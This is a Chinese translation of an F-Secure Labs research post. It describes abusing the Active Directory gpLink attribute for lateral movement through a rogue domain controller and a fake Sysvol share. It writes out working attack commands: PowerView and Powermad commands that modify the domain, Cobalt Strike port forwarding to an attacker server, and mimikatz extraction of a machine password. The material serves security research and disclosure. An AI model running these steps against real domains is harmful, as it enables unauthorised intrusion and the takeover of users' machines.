> 原文链接: https://www.anquanke.com//post/id/190585 


# gpLink在横向移动中的应用


                                阅读量   
                                **877801**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者f-secure，文章来源：labs.f-secure.com
                                <br>原文地址：[https://labs.f-secure.com/blog/ou-having-a-laugh/](https://labs.f-secure.com/blog/ou-having-a-laugh/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01e3c33b9d8d6db3d1.jpg)](https://p1.ssl.qhimg.com/t01e3c33b9d8d6db3d1.jpg)



## 0x00 前言

如果我们可以修改OU（Organizational Unit，组织单位），就能修改`gpLink`属性，搞定属于该OU及其子OU的任何计算机或者用户。

在开发[SharpGPOAbuse](https://labs.f-secure.com/tools/sharpgpoabuse)工具之前，我想了解下Windows如何处理GPO（Group Policy Object，组策略对象）以及不同GPO组件之前如何进行关联。在寻找可能的攻击方式时，我找到了一个比较特别的属性：[gpLink](https://docs.microsoft.com/en-us/windows/win32/adschema/a-gplink)。`gpLink`存在于所有AD（Active Directory，活动目录）容器中，比如Domain（域）对象以及OU中，并且包含与该容器有关的GPO所对应的LDAP路径。



## 0x01 GPO处理过程

虽然本文的重点并不是详细描述GPO的工作原理，但还是可以稍微总结下一些基本的概念，以便大家理解整个攻击步骤。

GPO由以下两个组件组成：
- GPC（Group Policy Container，组策略容器）：这是GPO的LDAP部分，包含相关属性
- GPT（Group Policy Template，组策略模板）：位于`Sysvol`中，包含实际的GPO设置
当客户端（用户或者主机）处理GPO设置时，将执行如下几个步骤：

1、客户端在目录结构中提取所有容器的`gpLink`属性。`gpLink`中包含必须被应用的GPO的LDAP路径。

2、客户端提取每个GPO关联的一些属性。其中有个属性为[gPCFileSysPath](https://docs.microsoft.com/en-us/windows/win32/adschema/a-gpcfilesyspath)，该属性包含实际GPO设置在`Sysvol`中的具体位置。

3、客户端与`gPCFileSysPath`指向的位置建立SMB连接。

4、客户端提取并应用GPO设置。

当然，以上只是简化版的操作过程，只列出了与本文介绍的攻击方式有关的一些步骤。需要注意的是，步骤1及步骤2依赖于LDAP协议（`389/tcp`端口），步骤3及步骤4依赖于SMB协议（`445/tcp`端口）。



## 0x02 攻击概览

为了实现攻击目标，我们需要满足如下条件：

1、我们需要具备必要的权限，以修改某个OU属性。

2、我们必须能够在目标域中添加计算机对象。

3、我们必须能够在目标域中添加DNS记录。

幸运的是，在默认配置的AD中，任何域用户都满足第2及第3个条件。

整个攻击过程如下图所示：

[![](https://p4.ssl.qhimg.com/t01844619a8c4df600d.gif)](https://p4.ssl.qhimg.com/t01844619a8c4df600d.gif)



## 0x03 具体步骤

接下来我们以实际案例演示整个攻击过程。在这个示例中，目标域名为`contoso.com`。假设我们已经搞定`bob.smith`，该用户登录到`WRKSTN02`工作站，具备修改`Finance` OU的权限。我们的目标用户为`alice.jones`，该用户是`Finance` OU的一个成员：

[![](https://p1.ssl.qhimg.com/t01e64adbe5b554c493.png)](https://p1.ssl.qhimg.com/t01e64adbe5b554c493.png)

`Bob`是`WRKSTN02`的本地管理员，虽然这并不是这种攻击的一个（严格）条件，但还是能简化我们的攻击示例过程。

[![](https://p1.ssl.qhimg.com/t017f4e5a432e41257b.png)](https://p1.ssl.qhimg.com/t017f4e5a432e41257b.png)

首先，我们需要为`test.contoso.com`添加一个新的DNS `A`记录，将其指向`bob.smith`登录的计算机（`WRKSTN02`）。我们可以使用[Powermad](https://github.com/Kevin-Robertson/Powermad)中的`Invoke-DNSUpdate`来完成该任务：

```
Invoke-DNSUpdate -DNSType A -DNSName test -DNSData 10.1.1.22 -Realm contoso.com
```

[![](https://p5.ssl.qhimg.com/t01dab70bc4da44d3a7.png)](https://p5.ssl.qhimg.com/t01dab70bc4da44d3a7.png)

接下来，由于我们可以修改`Finance` OU的属性，我们可以将其`gpLink`属性指向如下目标：

```
[LDAP://cn=`{`980F65E5-95F3-4536-81CF-1A48691F2D67`}`,cn=policies,cn=system,DC=test,DC=contoso,DC=com;0]
```

我们可以使用如下[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)函数来修改所需属性：

```
Get-DomainObject Finance | Set-DomainObject -Set @`{`'GpLink'='[LDAP://cn=`{`980F65E5-95F3-4536-81CF-1A48691F2D67`}`,cn=policies,cn=system,DC=test,DC=contoso,DC=com;0]'`}`
```

[![](https://p4.ssl.qhimg.com/t0154b7e9ec8b4c8795.png)](https://p4.ssl.qhimg.com/t0154b7e9ec8b4c8795.png)

这意味着当客户端处理这个`gpLink`属性时，就会向`test.contoso.com`发起LDAP连接，尝试提取GPO属性（如`gPCFileSysPath`、`versionNumber`等）。

由于客户端会向`test.contoso.com`（`10.1.1.22`）发起LDAP连接（`389/tcp`端口），因此我们需要拦截通信流量。为了完成该任务，我们可以使用Cobalt Strike的`rportfwd`命令，打开已控制主机的`389`端口，将其转发至目标网络外我们可控的某台服务器（`10.2.2.40`）：

[![](https://p5.ssl.qhimg.com/t01000eae82a2af02a2.png)](https://p5.ssl.qhimg.com/t01000eae82a2af02a2.png)

该服务器为某个虚拟域（`test.contoso.com`）的域控制器（DC，Domain Controller），当然这个虚拟域与目标域（`contoso.com`）并没有任何关系。这里我们将这台新主机称为`ATLANTIC$`。由于我们具备`ATLANTIC$`的控制权，因此可以运行[mimikatz](https://github.com/gentilkiwi/mimikatz)来提取明文形式的主机密码（首先运行`Reset-ComputerMachinePassword` powershell命令，然后运行`sekurlsa::logonpasswords`命令）。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01cfec1cdc6146975e.png)

现在我们已经拿到虚拟DC的主机密码，我们可以在原始`contoso.com`域中添加一个新的主机对象，将其密码设置为同一个密码。新的主机对象使用的名称为`TEST`。我们可以使用Powermad完成该任务（记得在密码字符串中使用正确的转义符）：

```
$pass = "cP:Wbp8!Faz-2`$06CXvM\*m`$U)+[a/VBA2&gt;60o8`"Ri1 bIMwxN,j8AWzFENk7)`$R;CSYG1%;UIi``8,]4PY`"G``hc&lt;'k63KroS(^rT9%BeI'V35lMN9YN7Pgh;"
New-MachineAccount -MachineAccount test -Password $(ConvertTo-SecureString $pass -AsPlainText -Force)
```

[![](https://p0.ssl.qhimg.com/t01a5638ae97631b421.png)](https://p0.ssl.qhimg.com/t01a5638ae97631b421.png)

我们还需要确保新主机对象已注册了如下SPN，这样当客户端尝试向我们的虚拟`test.contoso.com`域发起LDAP连接时，Kerberos认证过程能顺利通过（我使用的是稍加修改版的Powermad，以便在创建对象时注册这些SPN）。

```
LDAP/test.contoso.com
LDAP/TEST
HOST/TEST.contoso.com
HOST/TEST
```

现在，当客户端提取被修改的`gpLink`属性值时，就会请求与`LDAP/test.contoso.com`对应的TGS，而该TGS使用我们之前提供的`ATLANTIC$`主机的密码哈希进行加密。因此，当我们的虚拟域控拿到TGS后，就可以成功进行解密。

目前我们可以让客户端向我们控制的恶意DC发起LDAP连接。在执行GPO更新过程后（参考0x01节内容），客户端现在会请求包括`gPCFileSysPath`在内的一些GPO属性。因此，我们需要在伪造的`test.contoso.com`域中创建一个恶意GPO（这里称之为`TestGPO`），其中包含我们希望推送给受害者的各种设置。

[![](https://p4.ssl.qhimg.com/t010192543828c4b56d.png)](https://p4.ssl.qhimg.com/t010192543828c4b56d.png)

> 注意：我们之前修改过`Finance` OU的`gpLink`属性，其中的LDAP路径必须包含这个GPO的GUID信息。

在这个攻击场景中，我们可以简单创建一个计划任务，用来执行`calc.exe`。

[![](https://p4.ssl.qhimg.com/t010bc4fc6ffd34e710.png)](https://p4.ssl.qhimg.com/t010bc4fc6ffd34e710.png)

现在客户端会通过SMB连接到`gPCFileSysPath`所指向的位置，以便获取GPO设置。前面提到过，我们具备`WRKSTN02`的本地管理员权限，这是非常有用的一点。我们可以使用这些权限来创建一个新的共享目录（`Sysvol`），允许`Authenticated Users`组的成员读取目录内容：

[![](https://p4.ssl.qhimg.com/t017c814b2899350458.png)](https://p4.ssl.qhimg.com/t017c814b2899350458.png)

这个共享目录用来托管恶意GPO设置，我们可以从`test.contoso.com`域对应的“伪造”域控的`Sysvol`共享中拷贝这些设置。

此外，我们必须使用如下内容来替换`test.contoso.com`域中`TestGPO`对象`gPCFileSysPath`属性的已有值：

```
\\wrkstn02.contoso.com\SysVol\contoso.com\Policies\`{`980F65E5-95F3-4536-81CF-1A48691F2D67`}`
```

当客户端提取`gPCFileSysPath`属性的值时，会发现`TestGPO`的GPO设置位于`WRKSTN02`工作站的`Sysvol`共享中。

如下图所示，在下一个GPO刷新周期中，由于`alice.jones`为`Finance` OU的成员，因此前面设置的计划任务会成功创建，立即弹出计算器，代表我们攻击任务已成功完成：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01df430e6663ab1c5e.png)



## 0x04 总结

在上述过程中，我们使用恶意DC来托管恶意GPO（GPC）的LDAP组件，在已被突破的工作站上通过`Sysvol`共享来托管恶意GPO的具体设置（GPT）。

最后我们还需要注意一点，即使目标环境配置了强化版的UNC路径，这种攻击方式还是有可能成功。由于我们没有执行任何中间人攻击，并且kerberos认证过程也能正常工作，因此这种安全控制策略并不能用来防御这种技术。如下图所示，即使配置了强化版UNC路径，我们也能攻击成功：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0162009d70f4311168.png)

如下图所示，在Wireshark中，受害者主机`WRKSTN01`（`10.1.1.20`）及被攻击者控制的`WRKSTN02`（`10.1.1.22`）之间的SMB流量经过加密，表明目标环境已部署了强化版UNC路径：

[![](https://p0.ssl.qhimg.com/t015c99fcda2d52a671.png)](https://p0.ssl.qhimg.com/t015c99fcda2d52a671.png)

我们已向微软反馈了这种攻击方式，官方认为这是一种正常的行为，不会进行修复。

[![](https://p0.ssl.qhimg.com/t0108effa3c41a9f24e.jpg)](https://p0.ssl.qhimg.com/t0108effa3c41a9f24e.jpg)
